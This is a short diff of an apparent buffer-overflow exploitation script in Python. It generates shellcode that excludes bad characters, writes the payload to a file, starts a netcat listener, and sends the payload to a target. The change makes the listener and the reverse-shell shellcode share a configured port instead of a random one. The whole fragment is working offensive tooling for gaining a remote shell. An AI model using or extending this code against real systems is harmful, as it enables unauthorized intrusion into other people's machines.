@@ -186,8 +186,8 @@ def start_exploitation(shell_code, addr, prefix, offset, random_port, r_ip_port,
         with open('payload.txt', 'a+') as file:
             file.write(str(payload))
     logging_console("Generated payload, saved in `payload.txt`", "POSITIVE")
-    logging_console("Starting netcat", "VERBOSE")
-    netcat(random_port)
+    logging_console(f"Starting netcat @ port {r_ip_port[1]}", "VERBOSE")
+    netcat(r_ip_port[1])
     logging_console("Sending payload", "VERBOSE")
 
     # sending without using `send()` function, because the shell code will be wrong after decoding and encoding it!
@@ -286,10 +286,9 @@ def main(l_ip_port: tuple, r_ip_port: tuple, convention: str = "little", prefix=
     if convention == "little":
         addr = little_endian(addr)
 
-    random_port = random.randint(1100, 65000)
     bad_chars = ''.join(bad_chars)
     shell_code_thread = threading.Thread(
-        target=generate_shellcode_main, args=([(l_ip_port[0], random_port), bad_chars]))
+        target=generate_shellcode_main, args=([(l_ip_port[0], r_ip_port[1]), bad_chars]))
     shell_code_thread.start()
 
     counter = 0
